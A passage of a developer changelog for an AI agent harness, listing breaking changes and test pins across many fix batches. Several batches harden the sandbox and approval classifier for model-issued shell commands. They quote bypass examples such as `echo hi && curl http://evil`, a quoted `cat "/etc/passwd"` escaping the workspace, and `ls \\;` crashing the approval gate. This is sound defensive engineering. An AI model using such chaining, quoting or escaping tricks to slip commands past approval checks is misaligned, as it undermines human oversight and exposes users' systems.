| Pass 3b's input carries all labelled survivors instead of bare `raw_response` (#77/E13) | Anything matching the old input prefix | `critic_pass.md` reworded deliberately; `PASS_DIGESTS["Pass 3b"]` updated with a comment; single-candidate shape pinned unchanged |
| `pass_complete` gains `ok`/`text`; widget's `pass_completed(pass_id, *, ok)` REQUIRED (#115/E14) | An old caller omitting ok now TypeErrors at the widget -- the lock against ticking a failed row done | Sequence tests pin ok=False before a fatal raise and around an ensemble skip; removing the emission turns both RED |

Count 2232 -> 2241.

## Batch 20 -- the twentieth fix batch: what the harness does silently (2026-08-23)

Three production contracts changed, one of them behind a new switch. Every
mutation below was run RED against its reverted line before its commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| `check_output_policy` logs every alteration (#49) | A test asserting silence on an altered result | One WARNING per altered dispatch call naming tool/kind/count (+capped keys); five pins in `TestOutputPolicyAlterationsAreVisible`; silencing the block turns 3 RED |
| Credential-shape redaction joins vendor tokens (#167) | Output containing `password "..."`, `<password>...</password>` or `scheme://user:pass@host` now reads `[REDACTED]` in that value | Shapes are OUTPUT-ONLY (input refusals keep vendor tokens alone — pinned); placeholders/short values/non-password keywords survive; three mutations sighted |
| New kill switch: `config.REDACT_TOOL_OUTPUTS` + `VENASTINE_REDACT_OFF` | An environment or constant that used to do nothing now disables output redaction | Env can only turn it OFF; depth cap, input refusals and logging_setup's formatter stay unconditional — each pinned |
| `compact()`'s empty-summary outcome is `status="failed"`, `kind="compaction_failed"` (#136) | Anything switching on `status == "empty-summary"` or expecting `kind is None` | Aligned with COMPACTION_OUTCOMES' own vocabulary; `/compact` renders text only |
| The loop LATCHES on `compaction_failed` (#136) | A turn whose compaction failed once no longer retries on later steps — by design; next turn retries fresh | Spend pins assert `call_count == 1`; cheap outcomes deliberately not latched, pinned at 3 calls |

Count 2241 -> 2272.

## Batch 21 -- the twenty-first fix batch: the human surface (2026-08-23)

Five production contracts changed, all on the consent/answer side of the TUI.
Every mutation below was run RED against its reverted line before its commit
landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| One timeout callback for all six asks (#107) | A test asserting the old per-kind messages or silence-on-race | QUESTION's no-answer line is now true ("the model was told nobody answered"); every kind acknowledges an answer that landed just after the timeout; review's two strings byte-identical, pinned |
| Every modal centred + bounded at 80x24 (#112) | A test pushing a modal and reading its region | ReviewScreen had NO rules; four screens sat top-left; claims was 96 wide on 80 columns. The viewport test pushes all nine (+signoff-empty) asserting containment/centring/border/background -- a tenth screen needs its rules or it goes red |
| /goal read+clear do not construct a thread (#113) | A test expecting app.memory on those paths | Bare /goal and /goal clear answer "No goal set." without persisting a kind=chat row; only setting a goal builds one |
| ask_user refuses options-less AND textless questions (#114) | A tool call with `{"allow_text": false}` and no options | New shape refusal, checked before reachability; the pre-existing affordance probe now supplies options |
| /copy all is a superset (#140) | A test asserting the transcript-only payload | Adds `## Report` and `## Claims` sections (claims JSON identical to /copy claims); empty sections omitted; no-run payload unchanged |

Count 2272 -> 2309.

## Batch 22 -- the twenty-second fix batch: unit 10, the pipeline periphery (2026-08-23)

Five production files changed. Every mutation below ran RED against its reverted line
before its commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| Chart/PDF failure is contained AND named (#81) | A test asserting silent degradation | `fig = None` before the try (the old guard inverted into UnboundLocalError pre-bind); every degrade path in BOTH helpers warns naming helper+cause; import guards Exception-wide; the module docstring that reasoned "no graceful-degradation test needed" is rewritten |
| Pass-thread classification trusts the record before the clock (#82) | Tests asserting pure window behaviour on modern runs | Two tiers: ids from populated `pass_threads_json` relabel outright (even from abandoned runs); only absent/NULL/empty/corrupted rows fall back to the time window -- a pre-T2 set that cannot grow, so a concurrent session's chat thread is safe. Corrupted JSON warns naming the run. The unfinished-run guard now lives in Python and HAS a red test (it never could under `x <= NULL`) |
| A repeated synthesis finding reaches the human once (#85) | Tests feeding duplicate synthesis findings through consent | Synthesis dedupes on `(claim_id, kind, proposed.strip())`; claim-level kinds keep `(claim_id, kind)`. A stray claim_id is STRIPPED, kept, and the strip traced; the duplicate trace sentence no longer claims "same claim and kind" where there is no claim |
| CODE_STAGES deleted (#84) | Nothing -- it had no consumer | The why-stages-not-passes rationale moved onto the `stage` entry of PIPELINE_EVENT_KINDS |
| Periphery pins + one removal (#86) | -- | Six properties pinned (status-guard, pass_threads NULL default, V1 input, V5 re-target, candidates basis, unconditional pass_threads.json); missing-kind-column guard tested; the `getattr(run, "pass_threads", [])` fallback REMOVED -- no caller or double lacks the field |

Count 2309 -> 2328.

## Batch 23 -- the twenty-third fix batch: the first run (2026-08-23)

Three production files changed. Every mutation below ran RED against its
reverted line before its commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| providers.json is overridable, and its absence says so (#24) | Tests asserting the old "Unknown provider: X" / "Provider 'X' not found" strings | `AGENT_PROVIDERS_FILE` joins the four sibling env overrides (import-time constant, monkeypatchable); api_initialization distinguishes file-absent (names path + remedy) from provider-absent (names the configured set); load_credentials mirrors through the same two builders. ValueError TYPE unchanged -- callers catch the type |
| Launch says what /model says (#138) | Tests driving main() with exact stdout in a dir without providers.json | One warning pass before either shell starts, gated off --memories/--forget; TUI receives the warnings as data (`VenastineApp(startup_warnings=)`, written at mount -- a pre-mount print would vanish under Textual's screen). Warn-only everywhere; README gains the copy line it never had |
| A CLI --ref stores the label /ref always did (#171) | Tests calling attach_cli_refs without a thread_preview double | storage.thread_preview() is new public API and on STORAGE_SYMBOLS, so the fake_storage fixture redirects it automatically. Rows written by older CLIs keep "(no preview)" -- no backfill, deliberately |

Count 2328 -> 2346.

## Batch 24 -- the twenty-fourth fix batch: unit 14a, the app (2026-08-23)

Two production files changed (`tui/app.py`, `agents/tui_commands.py`). Every
mutation below ran RED against its reverted line before its commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| /grill-me is attended and assembles its own prompt (#109, #170) | Tests calling `run_one_shot(system_prompt, message)` | Signature is now `run_one_shot(agent, message)`: the method owns channel construction, catalog facts via `advertisement_facts`, the goal/refs/todos tiers, and the skills fragment -- prompt facts and run facts are one answer. `_cmd_grill` delegates. NO with_memories by design; test doubles in test_agents/test_skills updated |
| Quitting mid-run abandons the pipeline (#105) | Nothing external | `_forwarding(app, events, outcome)` breaks on `_shutting_down`, closes the generator (§22 abandoned), and work() reports `ResearchFinished(..., abandoned=True)` instead of writing artifacts or "pipeline failed". `_consume` deliberately untouched |
| `ResearchFinished` gains `abandoned` keyword | Positional callers unaffected | Fourth parameter, default False; a quit is not a failure and gets its own transcript line |
| exit() narrates, timeout narration goes silent after shutdown (#105 D4) | Tests asserting exact transcript at exit with a modal up | The busy warning is best-effort: under a modal there is no #transcript to write to (§27), hence NoMatches caught. `_timed_out_ask` returns early once `_shutting_down` -- post-quit narration described an app that had closed |
| `_shutting_down` is a class attribute default False | Bare-instance seams | Three test files build VenastineApp via __new__ for callback logic; instance-only assignment made the new reader raise there |
| Twelve coverage pins (#110) | Mutations only | Zero production changes were needed -- even /copy's unknown-target check already existed. Each pin's mutation listed in DEVLOG |

Count 2346 -> 2363.

## Batch 25 -- the twenty-fifth fix batch: effort reaches the pipeline (#139) (2026-08-23)

Four production files changed (`core/reasoning/orchestrator.py`,
`core/reasoning/json_retry.py`, `core/reasoning/review.py`, `main.py`) plus
the config surfaces (`config.py`, `core/config_loader.py`, `tui/app.py`).
Every mutation below ran RED against its reverted line before its commit
landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| `effort` keyword on six pipeline functions | Tests calling them positionally past the old tail are unaffected (keyword with default); tests asserting EXACT forwarded kwargs must add `effort=None` | `stream_deep_research_pipeline`, `run_deep_research_pipeline`, `_run_pass`, `_run_pass_with_json_retry`, `_review_stage`, `retry_until_json`. Threaded like authorization; test_e2e's exact-kwargs pin updated |
| review.py inherits effort (D4/V7) | Nothing external | `run_review`, `walk_consent`, `_decide_one`, `_refine` take and forward it |
| `--effort LEVEL` CLI flag + top-level settings.json `"effort"` key | Exact-argv parsers unaffected; `_KNOWN_SETTINGS` grew a key so an unknown-key test listing keys may need updating | Free string, not choices= -- the chokepoint validates. `resolve_effort(args, settings)` mirrors resolve_attended's None-default mechanism; "auto" is the explicit off switch at either layer |
| `config.DEFAULT_EFFORT` is now `"high"` (owner decision amending §16's silence-is-safe note) | Any test asserting the old None default; any exact-kwargs assertion on paths that now forward "high" | Known non-reasoning OpenAI models ship in MODEL_EFFORT_LEVELS mapped to [] (authoritative empty -> dropped cleanly). Unlisted endpoints fail loud; `--effort auto` reverts |
| TUI mount probes only NAMED efforts (`_effort_named`) | Tests asserting a probe for every mount | A default-derived level validated at call time instead -- probing it fired fallback WARNINGs on every launch and broke #138's healthy-mount silence (found by the suite going racy: process-global logging landed one app's warnings in another app's transcript) |

Count 2363 -> 2381.
## Batch 27 — the spend meter stops being a size limit (#4) (2026-08-24)

| Change | What breaks | Symptom / fix |
|---|---|---|
| Wrapper defaults: `max_total_tokens` is now `_SPEND_UNSET` on all four entry points | Any caller or test assuming the old `config.MAX_TOKEN_BUDGET` (250k chat / 1M pass) default now runs UNCAPPED unless settings.json sets `max_token_budget` | Deliberate (#4, owner decision). Explicit `None` still means genuinely uncapped — only the sentinel resolves settings. `test_spend_and_size.py::TestUncappedByDefault` pins both halves |
| `config.MAX_TOKEN_BUDGET`, `RESEARCH_PASS_TOKEN_BUDGET`, `INIT_TOKEN_BUDGET` deleted | `AttributeError` on any remaining reference | Production refs rewritten (orchestrator reviewer/retry, project_init, TUI direct `_run` call via `config_loader.spend_cap()`); ROADMAP.md's locked §1/§3 spec sketches still name the constant and are superseded, not edited |
| New top-level settings.json key `max_token_budget` (int \| null) | Unknown-key tests listing `_KNOWN_SETTINGS` may need updating; a wrong-typed value raises at load with "must be an int or null" | Cost knob, effort's merge rules. `spend_cap()` in config_loader is the single resolution point |
| `ModelResponse.turn_billed_tokens` / `.turn_new_tokens` (new fields, None until set by `_run()`) | Dataclass equality unaffected (both sides default None); exact-kwargs response assertions that construct expected objects gain nothing to change | Set per step by `_run()`; unpriced counts. `conftest.make_model_response` accepts both kwargs |
| `effective_compaction()` headroom advisory fires ONLY when a cap is configured | Tests asserting the advisory against the old unconditional budget (`test_compaction.py`) needed cap-configured mocks | Uncapped means nothing competes with compaction; the warning text names `max_token_budget` |
| TUI sidebar gains `UsageLine` (id `usage-line`); memory setter resets it | The batch-26 no-literal guard applies to its styling too (`system` role, not `style="dim"`) | Hidden until first turn; thread-since-resume billed · ctx; reset on every memory swap |

Count 2400 -> 2419.

## Batch 35 — the npm channel (2026-08-27)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `env_secrets.load_dotenv()` gains `find_dotenv(usecwd=True)` and an `AGENT_ENV_FILE` override | Reverting it re-breaks `.env` for every install where the harness does not sit in the working directory — which is every npm install and no checkout | `test_the_env_file_is_found_from_the_working_directory` and `test_agent_env_file_overrides_the_working_directory` in `test_credentials.py` -- both verified RED against the bare call before the fix. Note the pin must run a script FILE: under `python -c`, dotenv's `_is_interactive()` is true and sends resolution down its `os.getcwd()` branch, so a `-c` version passes against the bug. The bare call walks up from **`env_secrets.py`'s own directory**, so in a checkout it looks like cwd resolution and is not. Measured before the fix: a `.env` in cwd, harness imported from elsewhere, `get_env_secret()` saw `None`. Do not "simplify" the call |
| `credentials.no_providers_message()` names `os.getcwd()` only when the path is relative | A test matching the literal `"was not found in"` against an ABSOLUTE `AGENT_PROVIDERS_FILE` now fails — the clause is deliberately absent there | `test_an_absolute_providers_path_does_not_name_a_directory_it_never_checked`. Both existing matchers use a relative default and are unaffected. An absolute path is the whole answer already; naming cwd beside it sent the user to create the file in a directory the code never looked in |
| `package.json` `files` is an allowlist, not `.npmignore` | Deleting the key does not fail loudly — npm silently falls back to `.gitignore`, at which point `providers.json` is excluded by accident rather than decision, and a future `.gitignore` edit could expose it | `test_the_npm_allowlist_cannot_ship_a_secret`. The `!**/__pycache__`, `!**/*.pyc` and `!**/.ipynb_checkpoints` guards are required: directory entries sweep in whatever is inside them, and this tree really does contain a checkpoint copy of a prompt module |
| `package.json` `version` duplicates `pyproject.toml`'s | They drift, and npm cannot replace a published version — only deprecate it | `test_the_npm_package_and_pyproject_state_the_same_version`, plus `scripts/prepublish-check.mjs` at publish time. Bump both |
| `bin/venastine.mjs` must never assign `env.PYTHONPATH` or `env.AGENT_WORKSPACE` | Setting either looks reasonable and breaks something quietly: `tools/isolation.py` computes its child's `PYTHONPATH` from the parent's resolved `sys.path`, and `WORKSPACE_DIR` is the `file_ops` auto-approval boundary, not a storage path | `test_the_launcher_never_sets_the_two_variables_that_would_break_it`. `AGENT_WORKSPACE` is the live trap — it is the obvious next move after seeing `APP_DB_PATH` redirected two lines above, and it would auto-approve writes into a shared home directory from every project |
| The launcher sets `APP_DB_PATH` **and** `AGENT_LOG_FILE` together, on one condition | Splitting the condition gives a global database writing to a local log, which is worse than either arrangement | One `useGlobalState` test, both assignments under it. An existing `./app.db` always wins, so the launcher run inside a checkout uses that checkout's data |
| `.github/workflows/publish.yml` has three brakes (no push/tag trigger, `dry_run` default true, no `NPM_TOKEN`) | Removing any one of them moves the project closer to publishing before the repository is public — which publishes the source regardless of repo visibility, irreversibly | Not test-pinned; it is a workflow file, and `CONTRIBUTING.md` + `AGENTS.md` § *Distribution* record why each brake exists. Uncommenting the tag trigger is the deliberate act of arming the channel |

Count 2623 -> 2630.
## Batch 37 — the shell classifier and the workspace mount (2026-08-28)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `_SHELL_METACHARACTERS` rejects `'` and `"`, so a quoted command is never `INERT` | A test asserting a quoted argument stays inert now fails. Exactly one did: `test_dangerous_flags_rejected`'s `_is_inert("find . -name '*.py'") is True` | Intentional tier change, not a regression in the flag denylist — the line above it now tests the same thing unquoted. Reverting reopens the hole: the classifier splits on whitespace and `_run_inert` splits with `shlex`, which STRIPS quotes, so `cat "/etc/passwd"` was one token inside the workspace at classification time and two tokens naming the host's file at exec time. Pinned by `TestQuotingCannotHideAnEscape`, whose last test asserts the invariant over a corpus rather than the three spellings that were found |
| `run_sandboxed` refuses a workspace that overlaps the harness | A test calling `run_sandboxed` with the repo root, or with `~/.config/venastine`, now raises `SandboxUnavailable` instead of running | Use `tmp_path`, which every existing test already does. The check sits ABOVE audit #50's `makedirs`, so a refused workspace is not created either |
| `AGENT_WORKSPACE` overlapping the install tree is a startup failure (exit 2) | A launch configuration that pointed the workspace at the harness itself stops working | `main.py` prints the reason and names `./workspace`. The refusal set is narrow by design: `<harness>/workspace` and `<harness>/output` stay allowed, and a *nested* protected path is read-only-bound rather than refused |
| `security/` now imports `credentials` | The "imports `config` and the stdlib, and nothing else" rule in `ARCHITECTURE.md` had to be amended rather than quietly broken | `credentials` is a leaf (`json`, `os`) so there is no cycle. `logging_setup` was NOT imported for the same purpose — it pulls in `safety.policy_enforcement` — so the log path is re-derived and pinned by `test_the_log_directory_matches_logging_setup` |
| `test_a_refused_workspace_is_not_created` asserts against `os.makedirs`, not the filesystem | Rewriting it to check `os.path.exists` makes it pass or fail on what an earlier run left behind | It did exactly that during this batch's mutation testing: the mutation that removes the refusal let `makedirs` through, the real directory it created then failed the test under every LATER mutation, and five kills were scored that were actually one. A test that writes into the tree it is defending cannot be run twice |

Count 2642 -> 2686.

## Batch 38 — live output: progressive rendering and visible thinking (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| The Anthropic branch iterates the `MessageStream` instead of `stream.text_stream` | Every double shaped as `class _S: text_stream = [...]`. Two files had one: `test_client_streaming.py::_FakeAnthropicStream` and `test_client_translation.py::_stream_anthropic`'s local `_S` | `TypeError: '_S' object is not iterable`, raised from inside the `with client.messages.stream(...)` block — so it reads as a client-construction fault rather than a fake-shape one. Give the double an `__iter__` yielding `SimpleNamespace(type="text", text=...)`, and `SimpleNamespace(type="thinking", thinking=...)` for reasoning. The real names are pinned in `test_sdk_conformance.py`; a fake that drifts from them is the #35 shape again. The change is not optional: `text_stream` is built in `MessageStream.__init__` from the same underlying iterator `__iter__` walks, so a caller gets text or both kinds, never text plus thinking |
| `LoopEvent` has an eighth field, `thinking_delta` | `test_pipeline_events.py::test_loop_event_did_not_grow_an_eighth_field`, by design — that test exists to make this decision explicit | Renamed to `..._a_ninth_field` with the argument recorded in its docstring (§38 O4): P1 rejected the §22/§23 kinds because those describe a ten-pass RUN; a thinking delta is `token_delta`'s family. **Do not just widen the set** if a future field appears — the test working means stopping to write down why |
| `Transcript.stream_delta` now draws | A test asserting nothing is on screen until `flush_stream()`, or one counting `write` calls per turn | None existed. If one appears, it is asserting the defect: the widget's own docstring described this behaviour for two sections as a known cost |
| A streamed answer's `_entries` row is written once and then UPDATED | Code appending to `_entries` per committed chunk | `as_text()` would split one answer across its `\n\n` joins and `rerender()` would draw a `venastine ›` label per fragment. Pinned by `test_live_output.py::TestTheEntryLogSurvivesChunking` |
| `role_styles` gained a `thinking` slot | `test_themes.py::EXPECTED_ROLE_KEYS`, and any theme added without it | `assert set(styles) == EXPECTED_ROLE_KEYS` fails naming the theme. The slot must be non-empty — `assistant` is the one deliberately unstyled role |
| `test_docs_consistency.py`'s runtime-string anchor is computed, not hardcoded | Nothing; it was already wrong | It asserted `979 not in orch` while the real `yield from _stage("D0")` had drifted to 1059, so it was passing on a blank line and testing nothing. It now locates the line by content and fails loudly if that string disappears. A hardcoded line number in a test about drift is the one place it cannot be excused |
| `_render_blocks` drops a trailing newline and the structural newlines either side of a fence | A test asserting the exact ROW COUNT of a replayed or one-shot answer. None existed | Rich renders a trailing newline as an extra empty row, so a replayed answer carried blank lines the live stream never drew -- and `rerender()` replays through this path, so a `/theme` mid-session reflowed the transcript it was only meant to recolour. Found by rendering the same text both ways and diffing the rows, not by a test; `test_live_output.py::TestAStreamedAnswerRendersLikeAWrittenOne` is that diff, pinned |
| `Transcript._wrap_width` reproduces RichLog's own width rule | Nothing yet | `RichLog.write` shrinks to `scrollable_content_region.width` and then raises the result to `min_width` (78 by default), so in a sidebar-narrowed transcript the min_width is what decides the break. The first implementation guessed `content_size.width - 1` and wrapped streamed answers ~15 columns narrower than replayed ones. If a future textual changes that computation, this function has to follow it, not approximate it |

Count 2686 -> 2742.

## Batch 39 — the escaping bypass, and the first word of a compound command (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `\` joins `_SHELL_METACHARACTERS`, so a command containing one is never INERT | `_is_inert(r"cat sub\dir\notes.txt")` is now `False`. **On Windows this is a real regression, not just a tier change** | The spelling works today on the inert path (measured: `rc=0`, 302345 bytes back) because `_run_inert` uses `shlex.split(posix=False)` there and MSYS2's `cat` accepts backslash separators. It now classifies SANDBOXED and runs `bash -c` in a Linux container, which strips the backslashes: `cat: testsBREAKING_CHANGES.md: No such file or directory`. **Use forward slashes** — they work on Windows for every `INERT_COMMANDS` binary, most of which are Git-for-Windows builds. The failure is loud, and the trade is priced in §39 Q1: the alternative was a platform-conditional character class, which would have weakened batch 37's `posix=True`-everywhere invariant one day after it was locked |
| `_needs_network` takes a second argument | Every direct caller. `tests/test_shell.py::TestNeedsNetwork` had seven | `TypeError: _needs_network() missing 1 required positional argument: 'first_word_only'`. The flag is not a caller preference — it is `_is_inert`, and `classify_command` is the only production caller. Pass `False` for anything that could chain, `True` for a command already known inert |
| A non-inert command's ARGUMENTS can now request network | `test_keyword_in_args_does_not_grant_network`, which pinned the opposite rule and is gone. Anything auto-approved today that mentions a `NETWORK_ALLOWED_COMMANDS` word will start prompting | The deliberate reversal (§39 Q2). `echo hi && curl http://evil` was auto-approved on the strength of `echo` and ran under `--network none`; it now asks, and gets real network on approval. `python script.py # pip` is the priced false positive: the `#` makes it non-inert, so the scan reaches a word in a comment. Stripping comments would be parsing, which G2 forbids |
| Inert commands are exempt from that scan | A future "simplify: why does this take a flag at all?" edit | Deleting the carve-out makes `grep pip notes.txt` and `grep git notes.txt` prompt. An inert command carries no metacharacters, so it cannot chain — its first word is its only command position. Pinned by `TestChainingCannotHideBehindTheFirstWord::test_an_inert_command_is_unchanged` |
| `_within` returns `False` instead of raising on an unresolvable path | Nothing; it was an unhandled crash | `os.path.realpath` raises `OSError: [WinError 668]` on a malformed UNC token such as `\\;` on Windows, and `ValueError` on an embedded NUL (`a\0b`) on POSIX — neither fires on the other platform. `_within` runs inside `classify_command` → `registry.approval_needed()`, which is handed the model's tool input verbatim and has no handler above it. So `ls \\;` crashed the approval gate. The `except` must stay narrow: a bare `except` here reads every token as escaping and turns the whole inert tier into a prompt |
| The tokeniser-agreement invariant is generated, not enumerated | Nothing, but do not "simplify" it back to a list | Batch 37 wrote `test_the_classifier_and_the_executor_agree_on_every_token` with the right docstring — "over a corpus rather than over the three spellings that happened to be found" — and eight hand-written spellings underneath it, none containing a backslash. It passed for a day over the one character that broke it. The replacement generates from an alphabet containing everything shlex treats specially, and found `\\;` (Q3) on its first run |
| The generative corpus asserts on its own yield | A change to `INERT_COMMANDS`, or to the alphabet, that stops the corpus reaching the INERT tier | `assert seen_inert > 100` fails with the count. It is there because the first draft generated uniformly random strings whose first word was essentially never an inert command name, so every sample classified SANDBOXED and the test passed while measuring nothing — the vacuity class, caught by writing the guard before trusting the green |

| `TestTheGateAnswersForEveryString` pins the contract, not a token | A test that asserts `_within` is False for a specific spelling on every platform | `\\;` is a malformed UNC path on Windows and an ordinary relative filename on POSIX; `a\0b` is the reverse. Neither triggers the guard on both, so a token-based assertion is red on one platform and, worse, can be GREEN on the other for an unrelated reason — `\\?` passed on Windows because it is UNC-absolute and escapes, not because the guard fired. Pin the contract by patching `realpath` to raise; `skipif` the real triggers with the reason in the marker |

Count 2742 -> 2786.

## Batch 40 — the security posture is bound once (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `monkeypatch.setattr(config, "SHELL_APPROVAL_MODE", …)` no longer changes anything | Every test that set a security flag that way — 23 call sites across `test_shell.py` (21) and `test_policy_enforcement.py` (2) | The test does not error; it **passes the wrong thing** or fails on an unrelated assertion, because the flag is now read once at import. Use `set_posture(monkeypatch, shell_approval_mode="never")` from `tests/conftest.py`. That those call sites worked at all was the defect: they relied on the live read that §40 removed |
| `VENASTINE_REDACT_OFF` is read once, not per call | Any test that sets the env var and expects `redaction_enabled()` to follow | Use `rebind_posture(monkeypatch)` **after** the `setenv`, which is what a real process does at startup. This was the one security setting with an environment input, and it was live — `os.environ[...] = "1"` was an in-process switch for credential redaction |
| `_needs_network` / `containment_for` / `redaction_enabled` read `security.posture` | Code or tests that patched `config` to steer them | Patch the posture instead. `config.py` is still where a human writes the value; it is no longer what is read when a decision is made |
| **No module may read the posture at IMPORT time** | A module-level `posture.current()` anywhere in production code | Every launch dies in `apply_cli()`'s ordering guard with "would CHANGE the posture after it had already been read", because `main()` runs after every import. `tools/builtin/shell.py` hit this in the first draft — its import-time approval-mode validation now reads `config` directly, and `test_posture.py::test_no_module_reads_the_posture_at_import` scans for it |
| `apply_cli()` raises on a CHANGE after a read, not on a read | Nothing today; it is the shape a future caller must respect | Raising on the read alone was the first draft, and it made `main()` un-callable twice in one interpreter — which the suite does constantly. If you tighten this back, expect ~16 `test_cli.py` failures that have nothing to do with what you were testing |
| `scripts/prepublish-check.mjs` refuses an unsafe-mode tree | `npm publish` / `npm pack` from a branch carrying `UNSAFE_BRANCH` or a `config.py` declaring `UNSAFE_NO_*` | Intended (UN5). The guard lives on `main` so it travels into the branch by merge and also catches the reverse accident — unsafe code merged into main and published from there, which is the unrecoverable direction |
| A source-scan assertion must ignore commented-out lines | `test_the_publish_guard_is_wired_into_the_prepublish_check`, and any test written the same way | The first version asserted `"problems.push(...unsafeBranchProblems());" in src` and **survived the mutation that comments that exact line out**, because the substring is still there. Scan live lines only. Found by running the mutation, not by reading the assertion |

Count 2786 -> 2815.

## Batch 42 — the consent surface (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| Every non-literal renderable in `tui/screens.py` is wrapped in `Text(...)` | Any test reading a modal's content back off the constructor argument, and any new screen added without the wrap | `test_every_renderable_built_from_a_non_literal_is_wrapped` fails with the offending `(widget, lineno)` pairs. **Do not "simplify" it to `markup=False`** — it WORKS since the pin moved to 8.2.8 (on 1.0.0 the flag was stored by `__init__` and never read by the `visual` property, so it silently did nothing and the modal still raised). It is still not the answer: `Selection` and `Button` take no such flag and both parse what they are given, and a per-constructor argument is a thing the next screen has to remember. Both halves measured |
| The `permission_request` LoopEvent and the APPROVAL `Request` payload carry a `rationale` key | Any test asserting the whole dict — `test_streaming_loop.py` had one | `assert perm[0] == {...}` fails with an extra key. That test asserts the WHOLE dict on purpose and that is why it caught this; add `"rationale": None` rather than loosening it to a subset check. Present-and-None for a tool with no `rationale_param`, so a shell need not tell "this tool has no rationale" from "this build predates the field" |
| `param_digest(params)` is now `param_digest(params, omit=())` | Nothing — the parameter is optional | But **call `registry.call_digest(tool_name, params)` instead** unless you are writing a test about `param_digest` itself. The three production consumers moved; a fourth going direct would silently print a tool's rationale into a line sized for a command |
| `PermissionScreen.__init__` and `ask_permission_blocking` take a trailing `rationale` | Positional callers passing four arguments | Both default to `None`, so existing three-argument calls are unchanged. A test constructing the screen directly gets no rationale and shows `(none given)` |
| A `PermissionScreen` built directly cannot detect a break in `core/loop.py`'s wiring | Nothing today — it is why `test_the_loop_carries_the_reason_to_whoever_is_asked` exists | Measured, not assumed: replacing `registry.rationale_for(...)` with `None` in the loop left every modal test green. If you add a display assertion, add it beside a test that drives `_run()`, or it is a claim about a constructor rather than about the app |

## Batch 41 — the transcript's vocabulary (2026-08-29)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `LogRecordMessage(text, is_error)` is now `(text, role)` | Any test patching `Transcript.write_system` or `write_error` to observe a routed log record — `test_tui.py` had three | The test does not error, it goes **vacuous**: `write_system` is simply never called any more, so an assertion that nothing appeared there passes for the wrong reason. That is exactly what `test_info_is_not_routed_to_the_transcript` would have done. Patch `write_role` and assert on the `(role, text)` pair |
| `role_styles()["warning"]` is `bold {warning}`, not `{warning}` | Any caller composing its own weight on top | `GoalBanner` did, and produced `bold bold #d9a441` — Rich accepts it, and `test_a_theme_switch_restyles_the_goal_banner` compares the style string exactly, so it fails with a readable diff. Use the role verbatim; the weight is the role's decision now |
| `dark-plain`'s accent is `#b8c1d1`, not `#a9b2c3` | A test pinning that hex, and anything reading `$accent` in `app.tcss` expecting the old value | Intended (X1). It is the accent's turn at batch 29's #14 treatment, on a different axis: #14 measured contrast against the background, this measures separation from `secondary`, which is what `thinking` and `pass_done` render in. `tests/test_themes.py::test_a_tool_call_is_visibly_apart_from_a_reasoning_line` is the pin |
| The checklist marks moved to `tui.widgets.MARK_*` | Any assertion spelling a marker literally — there were seven, across `test_todo.py`, `test_pipeline_events.py` and `test_research_legibility.py` | `assert "x Pass 0" in text` fails with the rendered panel in the message. Import the constant and use an f-string; do not re-spell the glyph, or the next change to the vocabulary breaks the same seven assertions again |
| A test asserting a marker against `MARK_*` cannot detect a change to `MARK_*` | Nothing today — it is the reason `test_the_checkbox_marks_are_the_ballot_box_family` exists | The panel assertions now say "the panel uses the shared vocabulary", which is the right claim for them and is **not** a claim about which glyphs those are. The codepoints are pinned separately, by value. If you change a mark, that is the test that should go red, and it should be a decision |
| `ResearchProgress`'s failed row is `☒`, not `✗` | A test or doc claiming the panel shares the transcript's failed-tool glyph | Intended (X3). E14's actual constraint — a row that ended badly must not share a glyph with one that finished — is unchanged; what changed is that the three pass outcomes are now one visual family. The transcript's `✗` for a failed tool call is untouched |
| `policy_enforcement._redact_output_text` is now `redact_output_text` | Anything importing the private name — nothing did outside the module | It went public for the §41 diff (X4). If you are redacting something a tool PRODUCED, this is the function: `redact_secrets` is the vendor tokens only, and the three credential shapes (#167) live behind this one. Using the narrower call is a silent under-redaction, not an error |
| `file_ops._resolve_path` is now `resolve_path` | Anything importing the private name — `tests/test_file_ops.py` had one | `AttributeError: module 'tools.builtin.file_ops' has no attribute '_resolve_path'`. It went public deliberately (X4): the TUI has to land on the same file the tool will, and a second path computation at the call site would mean a diff of one file beside an edit to another |
| `write` and `edit` no longer print a param digest | A test asserting the tool line for either carries the path or the content | The line is `▸ write` exactly. The digest was the truncated payload the diff replaces, and printing both would put 60 characters of `old_text` directly above a block that says it properly. Every other tool, `read` included, is unchanged — `DIFFED_TOOLS` is the list |
| `Transcript._entries` can hold a `"diff"` role | Anything enumerating the roles it expects, or `as_text()` callers assuming a label per entry | `diff` is deliberately unlabelled in `as_text()`: the canonical block opens with the path, so a label would name the file twice. The entry's text is the block, parseable with `tui.diffs.parse` |
| A diff row must be padded AND written with an explicit `width=` | A "simplify: why not just `self.write(Text(...))`?" edit to `_write_padded` | `test_a_changed_row_is_marked_across_its_whole_width` goes red. RichLog raises a short row to `min_width` and `Strip.adjust_cell_length` pads the tail with an UNSTYLED segment, so the background stops at the last character of the source line. Dropping the pre-wrap fails the same way one row down: Rich's soft wrap styles each row but pads only the widest, measured at 78/75/78/66 cells |
| A new `diff_*` role needs two floors, not one | Adding a role that sets a background, or retuning `DIFF_TINT` | Foreground readable on the tint (≥ 4.5:1) **and** the tint visible against the page (≥ 1.15:1). The second is the one that binds: blending further toward the background improves the first monotonically while erasing the band the feature exists to draw, so a readability floor alone is satisfied by removing the feature |
| A new transcript role must clear three checks, not one | Adding a role to `MESSAGE_ROLES` in `tests/test_themes.py` | Pairwise-distinct style strings, a redmean separation of ≥ 120 from the roles it sits beside, and no `dim` unless it is `system`. If a role legitimately needs `dim`, say why in `test_dim_is_the_system_role_alone` rather than widening the exception silently — the whole point is that neither of the other two checks can see it |

## Batch 44 — the provider it is on, the reasoning it kept, and the project it is in (2026-08-31)

| Change | What breaks | Symptom / fix |
|---|---|---|
